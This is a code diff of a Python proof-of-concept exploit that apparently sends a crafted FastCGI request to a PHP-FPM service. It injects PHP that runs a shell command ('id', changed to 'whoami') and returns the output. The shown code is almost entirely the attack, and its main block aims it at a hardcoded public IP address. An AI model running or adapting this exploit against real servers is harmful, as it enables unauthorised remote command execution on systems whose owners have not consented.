@@ -234,7 +234,7 @@ def poc(host):
     params = dict()
     documentRoot = "/"
     uri = '/usr/local/lib/php/PEAR.php'
-    content = '<?php echo `id`;exit;?>'
+    content = '<?php echo `whoami`;exit;?>'
     params = {
         'GATEWAY_INTERFACE': 'FastCGI/1.0',
         'REQUEST_METHOD': 'POST',
@@ -257,7 +257,7 @@ def poc(host):
     }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
     response = client.request(params, content)
     #print(force_text(response))
-    return response
+    return response.strip().splitlines()[-1]
 
 if __name__ == '__main__':
     poc('59.64.78.184')
